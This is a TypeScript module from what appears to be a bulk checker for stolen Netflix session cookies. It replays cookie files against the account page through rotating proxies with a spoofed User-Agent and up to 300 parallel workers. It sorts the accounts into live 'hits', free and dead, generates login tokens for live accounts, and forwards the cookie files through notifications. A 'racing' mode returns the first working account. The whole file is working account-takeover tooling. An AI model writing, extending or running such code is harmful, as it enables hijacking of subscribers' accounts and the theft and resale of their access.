import type {
  AppConfig,
  CookieBundle,
  AccountInfo,
  CheckResult,
  CheckStatus,
  RunStats,
  PlanCount,
  ProgressUpdate,
  ProxyEntry,
  NfTokenData,
} from "./types.js";
import { extractCookieBundles, hasRequiredCookies, cookiesDictFromNetscape } from "./cookies.js";
import { extractInfo } from "./extract.js";
import {
  derivePlanInfo,
  deriveOutputPlanBucket,
  isSubscribedAccount,
  isOnHoldAccount,
  isExtraMemberAccount,
} from "./plan.js";
import { createNfToken, hasUsableNfToken } from "./nftoken.js";
import { getNfTokenMode, formatCookieFile, sendNotifications } from "./notifications.js";
import { describeHttpError } from "./utils.js";
import { parseProxies } from "./proxy.js";
import { fetchThroughProxy, getNextProxy, markProxyFailed, markProxySuccess, fetchAndValidateProxies, getProxyPoolStatus } from "./proxy-manager.js";
import { saveResult, updateResult, updateRunStats, deleteResultById, updateNfTokenData } from "./db.js";

const RETRYABLE_STATUS_CODES = new Set([403, 429, 500, 502, 503, 504]);

const REDIRECT_STATUS_CODES = new Set([301, 302, 303, 307, 308]);

const LOGIN_PAGE_INDICATORS = [
  /"login"/i,
  /netflix\.com\/login/i,
  /"signIn"/i,
  /"pageType"\s*:\s*"login"/i,
  /"pageType"\s*:\s*"signIn"/i,
  /id="appMountPoint"[\s\S]*?login/i,
];

const SUSPENDED_INDICATORS = [
  /account\s+(has\s+been\s+)?suspended/i,
  /account\s+(has\s+been\s+)?canceled/i,
  /account\s+(has\s+been\s+)?cancelled/i,
  /membership\s+(has\s+been\s+)?cancel/i,
  /"membershipStatus"\s*:\s*"CANCELLED"/i,
  /"membershipStatus"\s*:\s*"CANCELED"/i,
  /"membershipStatus"\s*:\s*"SUSPENDED"/i,
  /"membershipStatus"\s*:\s*"EX_MEMBER"/i,
];

const PAYMENT_INDICATORS = [
  /payment\s+(method\s+)?(failed|declined|issue)/i,
  /"pastDue"\s*:\s*true/i,
  /"isPastDue"\s*:\s*true/i,
  /payment_retry/i,
];

function isLoginPage(text: string): boolean {
  if (!text) return false;
  return LOGIN_PAGE_INDICATORS.some((p) => p.test(text));
}

function isSuspendedAccount(text: string): boolean {
  if (!text) return false;
  return SUSPENDED_INDICATORS.some((p) => p.test(text));
}

function hasPaymentIssue(text: string): boolean {
  if (!text) return false;
  return PAYMENT_INDICATORS.some((p) => p.test(text));
}

function deriveFailureReason(
  statusCode: number | null,
  responseText: string | null,
  extractedInfo: AccountInfo | null
): string {
  if (statusCode && REDIRECT_STATUS_CODES.has(statusCode)) {
    return "cookie expired (redirected to login)";
  }

  if (statusCode === 401) {
    return "cookie expired (unauthorized)";
  }

  if (statusCode === 404) {
    return "account page not found (HTTP 404)";
  }

  if (statusCode === 200 && responseText) {
    if (isLoginPage(responseText)) {
      return "cookie expired (login page returned)";
    }
    if (isSuspendedAccount(responseText)) {
      return "account suspended or canceled";
    }
    if (hasPaymentIssue(responseText)) {
      return "payment issue / past due";
    }
    if (extractedInfo && extractedInfo.membershipStatus) {
      const status = extractedInfo.membershipStatus.toLowerCase();
      if (status.includes("cancel") || status.includes("ex_member")) {
        return "account canceled";
      }
      if (status.includes("suspend")) {
        return "account suspended";
      }
    }
    return "incomplete account data (no subscription info found)";
  }

  if (statusCode && statusCode > 0) {
    return describeHttpError(statusCode);
  }

  return "incomplete account page";
}

interface CookieTask {
  kind: "bundle" | "missing_cookies" | "read_error";
  cookieFile: string;
  cookiePath: string;
  bundle?: CookieBundle;
  bundleIndex?: number;
  bundleTotal?: number;
  bundleFile?: string;
  bundleLabel?: string;
  removeSource?: boolean;
  fileName?: string;
  content?: string;
  resultId?: number;
}

export interface RunOptions {
  config: AppConfig;
  cookies: Array<{ name: string; content: string; resultId?: number }>;
  proxies: ProxyEntry[];
  threadCount: number;
  runId: string;
  onProgress?: (update: ProgressUpdate) => void;
  signal?: AbortSignal;
}

export interface RunHandle {
  runId: string;
  total: number;
  promise: Promise<RunStats>;
  cancel: () => void;
}

interface RunContext {
  options: RunOptions;
  counts: RunStats;
  planCounts: PlanCount;
  processed: number;
  total: number;
  processedEmails: Set<string>;
  cancelled: boolean;
  abortController: AbortController;
  /** When true, processTask uses minimal retries and skips NFToken generation.
   *  NFToken is generated after the race resolves for the winning cookie only. */
  racing?: boolean;
}

function generateUnknownGuid(): string {
  return `unknown${Math.floor(Math.random() * 90000000 + 10000000)}`;
}

function randomSuffix(): string {
  return Array.from({ length: 5 }, () => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return chars[Math.floor(Math.random() * chars.length)];
  }).join("");
}

async function fetchAccountPage(
  cookies: Record<string, string>,
  proxy: ProxyEntry | null,
  timeout: number,
  signal?: AbortSignal
): Promise<{ text: string; status: number; info: AccountInfo | null; proxyIp: string | null }> {
  const headers: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept-Encoding": "identity",
    Cookie: Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; "),
  };

  const url = "https://www.netflix.com/account/membership";

  // Use the proxy manager's fetchThroughProxy which automatically rotates proxies
  const result = await fetchThroughProxy(url, {
    headers,
    timeoutMs: timeout * 1000,
    signal,
    maxProxyRetries: 3,
  });

  const { text, status, proxyIp } = result;

  if (status === 200 && text) {
    const info = extractInfo(text);
    return { text, status, info, proxyIp };
  }
  return { text, status, info: null, proxyIp };
}

async function processTask(
  task: CookieTask,
  ctx: RunContext
): Promise<CheckResult> {
  const { options } = ctx;
  const config = options.config;

  if (task.kind === "read_error") {
    return { status: "error", reason: "file read error" };
  }

  if (task.kind === "missing_cookies") {
    return { status: "failed", reason: "missing required cookies" };
  }

  const bundle = task.bundle!;
  const netscapeContent = bundle.netscape_text;
  const cookies = bundle.cookies || cookiesDictFromNetscape(netscapeContent);

  if (!cookies || !hasRequiredCookies(cookies)) {
    return { status: "failed", reason: "missing required cookies" };
  }

  // In racing mode: use 1 attempt, no incomplete-info retries, skip NFToken
  const isRacing = ctx.racing === true;
  const maxRetryAttempts = isRacing ? 1 : Math.max(1, config.retries.error_proxy_attempts);
  const requestTimeout = Math.max(5, config.performance.request_timeout_seconds);
  const fallbackAccountPage = config.performance.fallback_account_page;
  const retryIncompleteInfo = isRacing ? false : config.performance.retry_incomplete_info;

  let responseText: string | null = null;
  let statusCode: number | null = null;
  let extractedInfo: AccountInfo | null = null;
  let lastError: Error | null = null;
  let usedProxyIp: string | null = null;

  for (let attempt = 0; attempt < maxRetryAttempts; attempt++) {
    if (ctx.cancelled) break;

    try {
      const result = await fetchAccountPage(cookies, null, requestTimeout, ctx.abortController.signal);
      responseText = result.text;
      statusCode = result.status;
      extractedInfo = result.info;
      usedProxyIp = result.proxyIp;

      if (statusCode === 200 && responseText) {
        if (retryIncompleteInfo && attempt < maxRetryAttempts - 1) {
          if (!extractedInfo || !hasCompleteAccountInfo(extractedInfo)) {
            continue;
          }
        }
        break;
      }
      if (statusCode && RETRYABLE_STATUS_CODES.has(statusCode) && attempt < maxRetryAttempts - 1) {
        continue;
      }
      break;
    } catch (err) {
      lastError = err as Error;
      if (attempt < maxRetryAttempts - 1) continue;
    }
  }

  // Process results
  if (statusCode === 200 && responseText) {
    const info = extractedInfo || extractInfo(responseText);
    if (info.countryOfSignup && info.countryOfSignup !== "null") {
      const isSubscribed = isSubscribedAccount(info);
      const [planKey, planFolderLabel, planName] = deriveOutputPlanBucket(info, isSubscribed);
      const onHold = isSubscribed && isOnHoldAccount(info);
      // Account loaded successfully but may still have a specific failure state
      if (!isSubscribed && !onHold) {
        const status = (info.membershipStatus || "").toLowerCase();
        if (status.includes("cancel") || status.includes("ex_member")) {
          return { status: "failed" as CheckStatus, reason: "account canceled" };
        }
        if (status.includes("suspend")) {
          return { status: "failed" as CheckStatus, reason: "account suspended" };
        }
      }

      // Generate userGuid
      const userGuid = info.userGuid && info.userGuid !== "null" ? info.userGuid : generateUnknownGuid();
      info.userGuid = userGuid;

      const country = info.countryOfSignup || "Unknown";
      const emailValue = (info.email || "").trim().toLowerCase();
      const dupKey = emailValue || userGuid;

      // Check duplicate
      if (ctx.processedEmails.has(dupKey)) {
        // Duplicate
        let nfTokenData: NfTokenData | null = null;
        if (!isRacing && isSubscribed && getNfTokenMode(config) !== "false") {
          const nfTokenAttempts = Math.max(1, config.retries.nftoken_attempts);
          [nfTokenData] = await createNfToken(cookies, nfTokenAttempts);
        }
        const formatted = formatCookieFile(config, info, netscapeContent, isSubscribed, nfTokenData);
        return {
          status: "duplicate",
          planKey,
          planName,
          country,
          email: emailValue,
          accountInfo: info,
          cookieContent: netscapeContent,
          formattedOutput: formatted,
          nfTokenData,
          proxyIp: usedProxyIp,
        };
      }
      ctx.processedEmails.add(dupKey);

      // Generate NFToken — skipped in racing mode (generated post-race for winner only)
      let nfTokenData: NfTokenData | null = null;
      const shouldGenNfToken = !isRacing && getNfTokenMode(config) !== "false" && (isSubscribed || config.performance.nftoken_for_free);
      if (shouldGenNfToken) {
        const nfTokenAttempts = Math.max(1, config.retries.nftoken_attempts);
        [nfTokenData] = await createNfToken(cookies, nfTokenAttempts);
      }

      const formatted = formatCookieFile(config, info, netscapeContent, isSubscribed, nfTokenData);
      const fileName = isSubscribed
        ? `${(info.maxStreams || "Unknown").replace(/}$/, "")}_${country}_${info.showExtraMemberSection}_${userGuid}_${randomSuffix()}.txt`
        : `PaymentM-${info.paymentMethodType ? "True" : "False"}_${country}_${userGuid}_${randomSuffix()}.txt`;

      // Send notifications (non-blocking)
      sendNotifications(config, info, isSubscribed, fileName, formatted, netscapeContent, nfTokenData).catch(() => {});

      const resultStatus: CheckStatus = isSubscribed ? "success" : "free";
      return {
        status: resultStatus,
        planKey,
        planName,
        country,
        email: emailValue,
        onHold,
        accountInfo: info,
        cookieContent: netscapeContent,
        formattedOutput: formatted,
        nfTokenData,
        proxyIp: usedProxyIp,
      };
    } else {
      return { status: "failed" as CheckStatus, reason: deriveFailureReason(statusCode, responseText, info), proxyIp: usedProxyIp };
    }
  } else if (lastError || (statusCode && RETRYABLE_STATUS_CODES.has(statusCode))) {
    let reason: string;
    if (statusCode && RETRYABLE_STATUS_CODES.has(statusCode)) {
      reason = describeHttpError(statusCode);
    } else if (lastError?.name === "AbortError" || lastError?.name === "TimeoutError") {
      reason = "timeout";
    } else {
      reason = "proxy error";
    }
    return { status: "error" as CheckStatus, reason, proxyIp: usedProxyIp };
  } else {
    return { status: "failed" as CheckStatus, reason: deriveFailureReason(statusCode, responseText, extractedInfo), proxyIp: usedProxyIp };
  }
}

function hasCompleteAccountInfo(info: AccountInfo | null): boolean {
  if (!info) return false;
  const required = ["countryOfSignup", "membershipStatus", "localizedPlanName", "maxStreams", "videoQuality"];
  return required.every((f) => {
    const val = (info as any)[f];
    return val && val !== "null";
  });
}

/**
 * Race-check: check multiple cookies in parallel, returning the first live (success) result.
 * Dead/free/failed results are still processed (DB updates, notifications) but the function
 * resolves as soon as a live hit is found, aborting remaining checks.
 * If no live hit is found, resolves with the best non-live result (first non-error).
 *
 * @returns the winning CheckResult and the index of the cookie that produced it.
 */
export async function runCheckRacing(
  opts: RunOptions
): Promise<{ result: CheckResult; cookieIndex: number } | null> {
  const { config, cookies, threadCount, runId, signal } = opts;

  // Build tasks per cookie (one task per cookie, first bundle only for racing)
  interface RaceTask {
    cookieIndex: number;
    task: CookieTask;
    resultId?: number;
  }

  const raceTasks: RaceTask[] = [];
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    const bundles = extractCookieBundles(cookie.content);
    if (!bundles.length) {
      raceTasks.push({
        cookieIndex: i,
        task: { kind: "missing_cookies", cookieFile: cookie.name, cookiePath: cookie.name },
        resultId: cookie.resultId,
      });
      continue;
    }
    // Use first bundle only for racing — we want speed, not exhaustive bundle coverage
    const bundle = bundles[0];
    raceTasks.push({
      cookieIndex: i,
      task: {
        kind: "bundle",
        cookieFile: cookie.name,
        cookiePath: cookie.name,
        bundle,
        bundleIndex: 0,
        bundleTotal: bundles.length,
        bundleFile: cookie.name,
        bundleLabel: cookie.name,
        resultId: cookie.resultId,
      },
      resultId: cookie.resultId,
    });
  }

  const ctx: RunContext = {
    options: opts,
    counts: { hits: 0, free: 0, bad: 0, duplicate: 0, on_hold: 0, errors: 0 },
    planCounts: {},
    processed: 0,
    total: raceTasks.length,
    processedEmails: new Set(),
    cancelled: false,
    abortController: new AbortController(),
    racing: true,
  };

  // Link external signal to our internal abort
  if (signal) {
    signal.addEventListener(
      "abort",
      () => {
        ctx.cancelled = true;
        ctx.abortController.abort();
      },
      { once: true }
    );
  }

  // Shared mutable state for racing
  let winnerIndex = -1;
  let winnerResult: CheckResult | null = null;
  let bestFallback: { result: CheckResult; cookieIndex: number } | null = null;
  let taskIndex = 0;

  const concurrency = Math.min(threadCount, 300, raceTasks.length);

  async function raceWorker(): Promise<void> {
    while (taskIndex < raceTasks.length && !ctx.cancelled) {
      // Stop if we already have a winner
      if (winnerIndex >= 0) return;

      const myIndex = taskIndex++;
      const raceTask = raceTasks[myIndex];
      const result = await processTask(raceTask.task, ctx);

      ctx.processed++;

      // Update DB for this result (non-blocking)
      if (result.status === "free" && raceTask.resultId) {
        deleteResultById(raceTask.resultId).catch(() => {});
      } else if (result.status !== "duplicate" && result.status !== "free") {
        if (raceTask.resultId) {
          updateResult(raceTask.resultId, result).catch(() => {});
        } else {
          saveResult(runId, result).catch(() => {});
        }
      }

      // Send progress
      if (opts.onProgress) {
        opts.onProgress({
          type: "result",
          runId,
          status: result.status,
          planKey: result.planKey,
          planName: result.planName,
          country: result.country,
          email: result.email,
          reason: result.reason,
          onHold: result.onHold,
          processed: ctx.processed,
          total: ctx.total,
          left: ctx.total - ctx.processed,
          counts: { ...ctx.counts },
          planCounts: { ...ctx.planCounts },
          accountInfo: result.accountInfo,
          cookieContent: result.cookieContent,
          formattedOutput: result.formattedOutput,
          nfTokenData: result.nfTokenData,
          proxyIp: result.proxyIp,
        });
      }

      // Check if this is a winner (live hit)
      if (result.status === "success") {
        winnerIndex = raceTask.cookieIndex;
        winnerResult = result;
        // Abort all remaining workers
        ctx.cancelled = true;
        ctx.abortController.abort();
        return;
      }

      // Track best fallback (first non-error, non-duplicate result)
      if (
        !bestFallback &&
        result.status !== "error" &&
        result.status !== "duplicate"
      ) {
        bestFallback = { result, cookieIndex: raceTask.cookieIndex };
      }
    }
  }

  const workers = Array.from({ length: concurrency }, () => raceWorker());
  await Promise.all(workers);

  // Clear the abort so we don't leak — the aborted signal would prevent
  // further fetches if someone reuses the context, but we're done.
  if (opts.onProgress) {
    opts.onProgress({
      type: "complete",
      runId,
      processed: ctx.processed,
      total: ctx.total,
      left: 0,
      counts: { ...ctx.counts },
      planCounts: { ...ctx.planCounts },
    });
  }

  updateRunStats(
    runId,
    ctx.counts,
    ctx.total,
    winnerIndex >= 0 ? "completed" : "completed"
  ).catch(() => {});

  if (winnerResult && winnerIndex >= 0) {
    // Post-race: generate NFToken for the winning cookie IN THE BACKGROUND.
    // We don't await this — the caller gets the result immediately and can
    // fetch the NFToken separately via /api/nftoken/:id once it's ready.
    const winnerCookie = cookies[winnerIndex];
    const shouldGenNfToken =
      getNfTokenMode(config) !== "false" &&
      (winnerResult.status === "success" || config.performance.nftoken_for_free);
    if (shouldGenNfToken) {
      const bundles = extractCookieBundles(winnerCookie.content);
      const bundle = bundles[0];
      if (bundle) {
        const cookieDict = bundle.cookies || cookiesDictFromNetscape(bundle.netscape_text);
        if (cookieDict && hasRequiredCookies(cookieDict)) {
          const nfTokenAttempts = Math.max(1, config.retries.nftoken_attempts);
          const resultId = raceTasks[winnerIndex]?.resultId;
          // Fire-and-forget: generate NFToken and update DB + formatted output in background
          createNfToken(cookieDict, nfTokenAttempts)
            .then(([nfTokenData]) => {
              if (!nfTokenData) return;
              winnerResult.nfTokenData = nfTokenData;
              if (winnerResult.accountInfo && winnerResult.cookieContent) {
                const isSubscribed = winnerResult.status === "success";
                winnerResult.formattedOutput = formatCookieFile(
                  config,
                  winnerResult.accountInfo,
                  winnerResult.cookieContent,
                  isSubscribed,
                  nfTokenData
                );
              }
              // Update DB with the generated token
              if (resultId) {
                updateNfTokenData(resultId, nfTokenData, winnerResult.formattedOutput).catch(() => {});
              }
            })
            .catch(() => {});
        }
      }
    }

    // Send notifications for the winner (non-blocking)
    if (winnerResult.accountInfo && winnerResult.cookieContent) {
      const isSubscribed = winnerResult.status === "success";
      const fileName = isSubscribed
        ? `${(winnerResult.accountInfo.maxStreams || "Unknown").replace(/}$/, "")}_${winnerResult.country || "Unknown"}_${winnerResult.accountInfo.showExtraMemberSection}_${winnerResult.accountInfo.userGuid || "unknown"}_${randomSuffix()}.txt`
        : `PaymentM-${winnerResult.accountInfo.paymentMethodType ? "True" : "False"}_${winnerResult.country || "Unknown"}_${winnerResult.accountInfo.userGuid || "unknown"}_${randomSuffix()}.txt`;
      sendNotifications(
        config,
        winnerResult.accountInfo,
        isSubscribed,
        fileName,
        winnerResult.formattedOutput || "",
        winnerResult.cookieContent,
        winnerResult.nfTokenData
      ).catch(() => {});
    }

    return { result: winnerResult, cookieIndex: winnerIndex };
  }

  // No live hit — return best fallback or null
  return bestFallback;
}

export async function runCheck(opts: RunOptions): Promise<RunStats> {
  const { config, cookies, proxies, threadCount, runId, onProgress, signal } = opts;

  // Build tasks
  const tasks: CookieTask[] = [];
  for (const cookie of cookies) {
    const bundles = extractCookieBundles(cookie.content);
    if (!bundles.length) {
      tasks.push({
        kind: "missing_cookies",
        cookieFile: cookie.name,
        cookiePath: cookie.name,
      });
      continue;
    }
    for (const bundle of bundles) {
      tasks.push({
        kind: "bundle",
        cookieFile: cookie.name,
        cookiePath: cookie.name,
        bundle,
        bundleIndex: bundle.index,
        bundleTotal: bundle.total,
        bundleFile: cookie.name,
        bundleLabel: bundle.total > 1 ? `${cookie.name} [${bundle.index}/${bundle.total}]` : cookie.name,
        resultId: cookie.resultId,
      });
    }
  }

  const total = tasks.length;
  const ctx: RunContext = {
    options: opts,
    counts: { hits: 0, free: 0, bad: 0, duplicate: 0, on_hold: 0, errors: 0 },
    planCounts: {},
    processed: 0,
    total,
    processedEmails: new Set(),
    cancelled: false,
    abortController: new AbortController(),
  };

  if (signal) {
    signal.addEventListener("abort", () => {
      ctx.cancelled = true;
      ctx.abortController.abort();
    }, { once: true });
  }

  // Process tasks with limited concurrency
  const concurrency = Math.min(threadCount, 300);
  let taskIndex = 0;

  async function worker() {
    while (taskIndex < tasks.length && !ctx.cancelled) {
      const myIndex = taskIndex++;
      const task = tasks[myIndex];
      const result = await processTask(task, ctx);

      // Update counts
      ctx.processed++;
      const counts = ctx.counts;
      switch (result.status) {
        case "success":
          counts.hits++;
          if (result.onHold) counts.on_hold++;
          if (result.planKey) {
            ctx.planCounts[result.planKey] = (ctx.planCounts[result.planKey] || 0) + 1;
          }
          break;
        case "free":
          counts.free++;
          if (result.planKey) {
            ctx.planCounts[result.planKey] = (ctx.planCounts[result.planKey] || 0) + 1;
          }
          break;
        case "failed":
          counts.bad++;
          break;
        case "duplicate":
          counts.duplicate++;
          break;
        case "error":
          counts.errors++;
          break;
      }

      // Save to DB (non-blocking) — skip duplicates and free accounts
      // Free accounts are not stored; if rechecking an existing row that is now free, delete it.
      if (result.status === "free" && task.resultId) {
        deleteResultById(task.resultId).catch(() => {});
      } else if (result.status !== "duplicate" && result.status !== "free") {
        if (task.resultId) {
          // Recheck mode: update the existing row so status/counts stay accurate
          updateResult(task.resultId, result).catch(() => {});
        } else {
          saveResult(runId, result).catch(() => {});
        }
      }

      // Send progress update
      if (onProgress) {
        onProgress({
          type: "result",
          runId,
          status: result.status,
          planKey: result.planKey,
          planName: result.planName,
          country: result.country,
          email: result.email,
          reason: result.reason,
          onHold: result.onHold,
          processed: ctx.processed,
          total: ctx.total,
          left: ctx.total - ctx.processed,
          counts: { ...counts },
          planCounts: { ...ctx.planCounts },
          accountInfo: result.accountInfo,
          cookieContent: result.cookieContent,
          formattedOutput: result.formattedOutput,
          nfTokenData: result.nfTokenData,
          proxyIp: result.proxyIp,
        });
      }
    }
  }

  const workers = Array.from({ length: concurrency }, () => worker());
  await Promise.all(workers);

  // Final update
  if (onProgress) {
    onProgress({
      type: "complete",
      runId,
      processed: ctx.processed,
      total: ctx.total,
      left: 0,
      counts: { ...ctx.counts },
      planCounts: { ...ctx.planCounts },
    });
  }

  // Update DB with final stats
  updateRunStats(runId, ctx.counts, ctx.total, ctx.cancelled ? "cancelled" : "completed").catch(() => {});

  return ctx.counts;
}
